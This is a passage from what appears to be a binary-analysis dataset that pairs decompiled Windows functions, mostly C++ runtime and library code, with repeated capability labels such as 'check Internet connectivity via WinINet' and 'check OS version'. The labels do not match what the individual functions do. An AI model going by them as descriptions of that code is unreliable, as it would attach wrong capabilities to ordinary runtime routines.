fcn.0040a29a();\n    *(unaff_EBP + -0x10) = **puVar5;\n    *(unaff_EBP + -0xf) = 0x65;\n    *(unaff_EBP + -0xe) = 0;\n    iVar6 = fcn.0040a2c0(pcVar9, 0x65, *(unaff_EBP + 0x30));\n    iVar7 = fcn.0040a2c0(pcVar9, *(unaff_EBP + -0x10), *(unaff_EBP + 0x30));\n    *(unaff_EBP + 0x20) = iVar7;\n    if (iVar7 == 0) {\n        *(unaff_EBP + 0x2c) = 0;\n    }\n    pcVar8 = *(unaff_EBP + -0x5c);\n    if (*(unaff_EBP + -0x48) < 0x10) {\n        pcVar8 = unaff_EBP + -0x5c;\n    }\n    if (*pcVar8 != '\\x7f') {\n        pcVar8 = *(unaff_EBP + -0x5c);\n        if (*(unaff_EBP + -0x48) < 0x10) {\n            pcVar8 = unaff_EBP + -0x5c;\n        }\n        if ('\\0' < *pcVar8) {\n            fcn.00406a48(pcVar9, *(unaff_EBP + 0x30));\n            if (iVar6 == 0) {\n                fcn.004065a3(*(unaff_EBP + 0x2c), 0x30);\n            }\n            else {\n                if (*(unaff_EBP + 0x20) == 0) {\n                    fcn.004065a3(*(unaff_EBP + 0x24), 0x30);\n                    *(unaff_EBP + 0x24) = 0;\n                }\n                fcn.004065f3(iVar6 - pcVar9, *(unaff_EBP + 0x2c), 0x30);\n            }\n            if (*(unaff_EBP + 0x20) == 0) {\n                fcn.004065a3(*(unaff_EBP + 0x24), 0x30);\n            }\n            else {\n                iVar6 = *(unaff_EBP + 0x20) - pcVar9;\n                fcn.004065f3(iVar6 + 1, *(unaff_EBP + 0x28), 0x30);\n                fcn.004065f3(iVar6, *(unaff_EBP + 0x24), 0x30);\n                *(unaff_EBP + 0x28) = 0;\n            }\n            pcVar9 = *(unaff_EBP + -0x5c);\n            *(unaff_EBP + 0x24) = 0;\n            if (*(unaff_EBP + -0x48) < 0x10) {\n                pcVar9 = unaff_EBP + -0x5c;\n            }\n            uVar12 = 0;\n            uVar3 = fcn.00405ae6(0);\n            iVar6 = fcn.0040a370(uVar3, uVar12);\n            while (((cVar1 = *pcVar9,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < iVar6 - *(unaff_EBP + -0x14)))) {\n                iVar6 = iVar6 - cVar1;\n                fcn.004065f3(iVar6, 1, 0);\n                if ('\\0' < pcVar9[1]) {\n                    pcVar9 = pcVar9 + 1;\n                }\n            }\n            pcVar9 = fcn.00405ae6(0);\n            *(unaff_EBP + 0x2c) = 0;\n            *(unaff_EBP + 0x30) = *(unaff_EBP + -0x30);\n        }\n    }\n    uVar11 = *(*(unaff_EBP + 0x18) + 0x18);\n    uVar10 = *(unaff_EBP + 0x24) + *(unaff_EBP + 0x28) + *(unaff_EBP + 0x2c) + *(unaff_EBP + 0x30);\n    if ((uVar11 < 1) || (uVar11 <= uVar10)) {\n        *(unaff_EBP + 0x20) = 0;\n    }\n    else {\n        *(unaff_EBP + 0x20) = uVar11 - uVar10;\n    }\n    uVar3 = *(unaff_EBP + 8);\n    uVar11 = *(*(unaff_EBP + 0x18) + 0x10) & 0x1c0;\n    if (uVar11 != 0x40) {\n        if ((uVar11 == 0x100) && (*(unaff_EBP + -0x14) != 0)) {\n            puVar5 = fcn.0040625d(uVar3, unaff_EBP + -0x18, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), pcVar9, 1);\n            *(unaff_EBP + 0x10) = *puVar5;\n            uVar12 = puVar5[1];\n            pcVar9 = pcVar9 + 1;\n            *(unaff_EBP + 0x30) = *(unaff_EBP + 0x30) + -1;\n            *(unaff_EBP + 0x14) = uVar12;\n        }\n        puVar5 = fcn.00406108(uVar3, unaff_EBP + -0x18, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), *(unaff_EBP + 0x1c), \n                              *(unaff_EBP + 0x20));\n        *(unaff_EBP + 0x10) = *puVar5;\n        uVar12 = puVar5[1];\n        *(unaff_EBP + 0x20) = 0;\n        *(unaff_EBP + 0x14) = uVar12;\n    }\n    iVar6 = fcn.0040a2c0(pcVar9, *(unaff_EBP + -0x10), *(unaff_EBP + 0x30));\n    if (iVar6 != 0) {\n        iVar7 = (iVar6 - pcVar9) + 1;\n        puVar5 = fcn.00406291(uVar3, unaff_EBP + -0x18, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), pcVar9, iVar6 - pcVar9\n                              , *(unaff_EBP + -0x1c));\n        *(unaff_EBP + 0x10) = *puVar5;\n        *(unaff_EBP + 0x14) = puVar5[1];\n        puVar5 = fcn.00406108(uVar3, unaff_EBP + -0x18, *puVar5, puVar5[1], 0x30, *(unaff_EBP + 0x24));\n        *(unaff_EBP + 0x10) = *puVar5;\n        *(unaff_EBP + 0x14) = puVar5[1];\n        uVar2 = (**(**(unaff_EBP + -0x24) + 4))();\n        *(unaff_EBP + 0x24) = uVar2;\n        puVar5 = fcn.00406108(uVar3, unaff_EBP + -0x28, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), *(unaff_EBP + 0x24), 1\n                             );\n        *(unaff_EBP + 0x10) = *puVar5;\n        *(unaff_EBP + 0x14) = puVar5[1];\n        puVar5 = fcn.00406108(uVar3, unaff_EBP + -0x28, *puVar5, puVar5[1], 0x30, *(unaff_EBP + 0x28));\n        uVar12 = *puVar5;\n        *(unaff_EBP + 0x30) = *(unaff_EBP + 0x30) - iVar7;\n        *(unaff_EBP + 0x10) = uVar12;\n        pcVar9 = pcVar9 + iVar7;\n        *(unaff_EBP + 0x14) = puVar5[1];\n    }\n    iVar6 = fcn.0040a2c0(pcVar9, 0x65, *(unaff_EBP + 0x30));\n    if (iVar6 != 0) {\n        iVar7 = (iVar6 - pcVar9) + 1;\n        puVar5 = fcn.00406291(uVar3, unaff_EBP + -0x28, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), pcVar9, iVar6 - pcVar9\n                              , *(unaff_EBP + -0x1c));\n        *(unaff_EBP + 0x10) = *puVar5;\n        *(unaff_EBP + 0x14) = puVar5[1];\n        puVar5 = fcn.00406108(uVar3, unaff_EBP + -0x28, *puVar5, puVar5[1], 0x30, *(unaff_EBP + 0x2c));\n        uVar12 = *puVar5;\n        *(unaff_EBP + 0x2c) = 0;\n        *(unaff_EBP + 0x10) = uVar12;\n        *(unaff_EBP + 0x14) = puVar5[1];\n        uVar12 = 0x41d948;\n        if ((*(*(unaff_EBP + 0x18) + 0x10) & 4) == 0) {\n            uVar12 = 0x41d944;\n        }\n        puVar5 = fcn.0040625d(uVar3, unaff_EBP + -0x28, *puVar5, puVar5[1], uVar12, 1);\n        uVar12 = *puVar5;\n        *(unaff_EBP + 0x30) = *(unaff_EBP + 0x30) - iVar7;\n        *(unaff_EBP + 0x10) = uVar12;\n        pcVar9 = pcVar9 + iVar7;\n        *(unaff_EBP + 0x14) = puVar5[1];\n    }\n    puVar5 = fcn.00406291(uVar3, unaff_EBP + -0x28, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), pcVar9, \n                          *(unaff_EBP + 0x30), *(unaff_EBP + -0x1c));\n    *(unaff_EBP + 0x10) = *puVar5;\n    *(unaff_EBP + 0x14) = puVar5[1];\n    puVar5 = fcn.00406108(uVar3, unaff_EBP + -0x28, *puVar5, puVar5[1], 0x30, *(unaff_EBP + 0x2c));\n    uVar12 = *puVar5;\n    arg_1ch_00 = *(unaff_EBP + 0x20);\n    arg_18h_00 = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + 0x10) = uVar12;\n    arg_14h_00 = puVar5[1];\n    arg_ch_00 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    *(*(unaff_EBP + 0x18) + 0x18) = 0;\n    fcn.00406108(uVar3, arg_ch_00, uVar12, arg_14h_00, arg_18h_00, arg_1ch_00);\n    *(unaff_EBP + -4) = 1;\n    fcn.00405fd6(1, 0);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00405fd6(1, 0);\n    uVar3 = *(unaff_EBP + 0xc);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 3490
    },
    "00407d65": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n\nuint __cdecl\nfcn.00407d65(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uVar3;\n    uint arg_14h_00;\n    uchar uVar4;\n    uint uVar5;\n    char *pcVar6;\n    int32_t arg_ch_00;\n    uint32_t uVar7;\n    uint *puVar8;\n    char *pcVar9;\n    int32_t iVar10;\n    int32_t unaff_EBP;\n    char *arg_18h_00;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_3ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    uVar5 = fcn.00401328(unaff_EBP + -0x1c);\n    *(unaff_EBP + -4) = 0;\n    uVar5 = fcn.0040755a(uVar5);\n    *(unaff_EBP + -0x18) = uVar5;\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00401210();\n    fcn.0040668d(unaff_EBP + -0x40);\n    *(unaff_EBP + -4) = 1;\n    arg_18h_00 = *(unaff_EBP + 0x20);\n    cVar1 = *arg_18h_00;\n    if ((cVar1 == '+') || (cVar1 == '-')) {\n        *(unaff_EBP + -0x10) = 1;\n    }\n    else if ((cVar1 == '0') && ((arg_18h_00[1] == 'x' || (arg_18h_00[1] == 'X')))) {\n        *(unaff_EBP + -0x10) = 2;\n    }\n    else {\n        *(unaff_EBP + -0x10) = 0;\n    }\n    pcVar9 = *(unaff_EBP + -0x3c);\n    pcVar6 = pcVar9;\n    if (*(unaff_EBP + -0x28) < 0x10) {\n        pcVar6 = unaff_EBP + -0x3c;\n    }\n    if (*pcVar6 != '\\x7f') {\n        pcVar6 = pcVar9;\n        if (*(unaff_EBP + -0x28) < 0x10) {\n            pcVar6 = unaff_EBP + -0x3c;\n        }\n        if ('\\0' < *pcVar6) {\n            if (*(unaff_EBP + -0x28) < 0x10) {\n                pcVar9 = unaff_EBP + -0x3c;\n            }\n            iVar10 = *(unaff_EBP + 0x24);\n            while (((cVar1 = *pcVar9,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < iVar10 - *(unaff_EBP + -0x10)))) {\n                iVar10 = iVar10 - cVar1;\n                arg_ch_00 = (*(unaff_EBP + 0x24) - iVar10) + 1;\n                fcn.00409eec(iVar10 + 1 + *(unaff_EBP + 0x20), arg_ch_00, arg_18h_00 + iVar10, arg_ch_00);\n                *(unaff_EBP + 0x24) = *(unaff_EBP + 0x24) + 1;\n                arg_18h_00[iVar10] = '\\0';\n                if ('\\0' < pcVar9[1]) {\n                    pcVar9 = pcVar9 + 1;\n                }\n                arg_18h_00 = *(unaff_EBP + 0x20);\n            }\n        }\n    }\n    uVar7 = *(*(unaff_EBP + 0x18) + 0x18);\n    if ((uVar7 < 1) || (uVar7 < *(unaff_EBP + 0x24) || uVar7 == *(unaff_EBP + 0x24))) {\n        iVar10 = 0;\n    }\n    else {\n        iVar10 = uVar7 - *(unaff_EBP + 0x24);\n    }\n    uVar5 = *(unaff_EBP + 8);\n    uVar7 = *(*(unaff_EBP + 0x18) + 0x10) & 0x1c0;\n    if (uVar7 != 0x40) {\n        if (uVar7 == 0x100) {\n            puVar8 = fcn.0040625d(uVar5, unaff_EBP + -0x24, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), arg_18h_00, \n                                  *(unaff_EBP + -0x10));\n            arg_18h_00 = arg_18h_00 + *(unaff_EBP + -0x10);\n            *(unaff_EBP + 0x10) = *puVar8;\n            *(unaff_EBP + 0x14) = puVar8[1];\n            uVar2 = puVar8[1];\n            uVar3 = *puVar8;\n            *(unaff_EBP + 0x24) = *(unaff_EBP + 0x24) - *(unaff_EBP + -0x10);\n            puVar8 = fcn.00406108(uVar5, unaff_EBP + -0x24, uVar3, uVar2, *(unaff_EBP + 0x1c), iVar10);\n        }\n        else {\n            puVar8 = fcn.00406108(uVar5, unaff_EBP + -0x14, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                                  *(unaff_EBP + 0x1c), iVar10);\n        }\n        *(unaff_EBP + 0x10) = *puVar8;\n        iVar10 = 0;\n        *(unaff_EBP + 0x14) = puVar8[1];\n    }\n    uVar4 = (**(**(unaff_EBP + -0x18) + 8))();\n    *(unaff_EBP + 0x20) = uVar4;\n    puVar8 = fcn.00406291(uVar5, unaff_EBP + -0x24, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), arg_18h_00, \n                          *(unaff_EBP + 0x24), *(unaff_EBP + 0x20));\n    uVar2 = *puVar8;\n    uVar3 = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + 0x10) = uVar2;\n    arg_14h_00 = puVar8[1];\n    *(*(unaff_EBP + 0x18) + 0x18) = 0;\n    *(unaff_EBP + 0x14) = arg_14h_00;\n    fcn.00406108(uVar5, *(unaff_EBP + 0xc), uVar2, arg_14h_00, uVar3, iVar10);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00405fd6(1, 0);\n    uVar5 = *(unaff_EBP + 0xc);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar5;\n}\n",
        "token_count": 1819
    },
    "00408129": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00408129(uint arg_8h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    arg_8h_00 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00405009(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + *(*arg_8h_00 + 4) + 8) == 0) && (*(arg_8h_00 + *(*arg_8h_00 + 4) + 0x2c) != 0)) {\n        fcn.00408019();\n    }\n    *(extraout_ECX + 4) = *(*(*arg_8h_00 + 4) + 8 + arg_8h_00) == 0;\n    *(unaff_EBP + -4) = 0xffffffff;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 327
    },
    "00408624": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.00408624(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = 0;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    if (*(unaff_EBP + 0x10) != 0) {\n        *extraout_ECX = 0x41d984;\n        fcn.00404f39();\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x10) = 1;\n    }\n    arg_ch_00 = *(unaff_EBP + 0xc);\n    *(extraout_ECX + *(*extraout_ECX + 4)) = vtable.std::basic_istream_char__struct_std::char_traits_char__.0;\n    extraout_ECX[1] = 0;\n    fcn.00407f4b(*(unaff_EBP + 8), arg_ch_00);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 361
    },
    "00408b4a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n\nint32_t * fcn.00408b4a(void)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch_2;\n    uint var_10h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uint uStack4;\n    \n    uStack4 = 0x408b54;\n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = &fcn.00408b4a::var_20h;\n    *(unaff_EBP + -0x14) = 0;\n    arg_8h = *(unaff_EBP + 8);\n    fcn.00408129(arg_8h);\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x20) != '\\0') {\n        iVar2 = *(*(*arg_8h + 4) + 0x18 + arg_8h);\n        if (iVar2 < 2) {\n            iVar2 = 0;\n        }\n        else {\n            iVar2 = iVar2 + -1;\n        }\n        *(unaff_EBP + -4) = 1;\n        if ((*(*(*arg_8h + 4) + 0x10 + arg_8h) & 0x1c0) == 0x40) {\ncode_r0x00408be0:\n            iVar1 = fcn.004058a6(*(unaff_EBP + 0xc));\n            if (iVar1 == -1) {\n                *(unaff_EBP + -0x14) = 4;\n            }\n            while ((*(unaff_EBP + -0x14) == 0 && (0 < iVar2))) {\n                *(unaff_EBP + -0x18) = *(arg_8h + *(*arg_8h + 4) + 0x30);\n                iVar1 = fcn.004058a6(*(unaff_EBP + -0x18));\n                if (iVar1 == -1) {\n                    *(unaff_EBP + -0x14) = 4;\n                }\n                iVar2 = iVar2 + -1;\n                *(unaff_EBP + -0x1c) = iVar2;\n            }\n        }\n        else {\n            while (*(unaff_EBP + -0x14) == 0) {\n                if (iVar2 < 1) goto code_r0x00408be0;\n                *(unaff_EBP + -0x18) = *(arg_8h + *(*arg_8h + 4) + 0x30);\n                iVar1 = fcn.004058a6(*(unaff_EBP + -0x18));\n                if (iVar1 == -1) {\n                    *(unaff_EBP + -0x14) = 4;\n                }\n                iVar2 = iVar2 + -1;\n                *(unaff_EBP + -0x1c) = iVar2;\n            }\n        }\n        *(unaff_EBP + -4) = 0;\n    }\n    *(arg_8h + *(*arg_8h + 4) + 0x18) = 0;\n    fcn.00407731(*(unaff_EBP + -0x14), 0);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00408793();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return arg_8h;\n}\n",
        "token_count": 893
    },
    "0040994c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040994c(code **param_1)\n\n{\n    *param_1 = vtable.std::exception.0;\n    if (param_1[2] != NULL) {\n        fcn.0040a18d(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "00409b01": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00409b01(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x409bac;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00409bd8;\n        uStack36 = *0x44131c ^ &fcn.00409b01::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00409b01::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0040dbcd();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00409b01::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 722
    },
    "0040a18d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a18d(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0d8(0x421a20, 0xc);\n    iVar1 = *(unaff_EBP + 8);\n    if (iVar1 != 0) {\n        if (*0x4d4230 == 3) {\n            fcn.0040e5e0(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.0040e613(iVar1);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.0040e643(arg_8h_00, iVar1);\n            }\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.0040a1e3();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0040a215;\n            iVar1 = *(unaff_EBP + 8);\n        }\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x4d2568, 0, iVar1);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0040b586();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.0040b544(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\ncode_r0x0040a215:\n    fcn.0040f11d();\n    return;\n}\n",
        "token_count": 440
    },
    "0040b8b2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b8b2(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x44131c) {\n        return;\n    }\n    *0x4d2d98 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x4d2d9c = &arg_8h;\n    *0x4d2cd8 = 0x10001;\n    *0x4d2c80 = 0xc0000409;\n    *0x4d2c84 = 1;\n    var_328h = *0x44131c;\n    var_324h = *0x441320;\n    *0x4d2c8c = unaff_retaddr;\n    *0x4d2d64 = in_GS;\n    *0x4d2d68 = in_FS;\n    *0x4d2d6c = in_ES;\n    *0x4d2d70 = in_DS;\n    *0x4d2d74 = unaff_EDI;\n    *0x4d2d78 = unaff_ESI;\n    *0x4d2d7c = unaff_EBX;\n    *0x4d2d80 = in_EDX;\n    *0x4d2d84 = in_ECX;\n    *0x4d2d88 = in_EAX;\n    *0x4d2d8c = unaff_EBP;\n    *0x4d2d90 = unaff_retaddr;\n    *0x4d2d94 = in_CS;\n    *0x4d2da0 = in_SS;\n    *0x4d2cd0 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040e3f5(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x41eb3c);\n    if 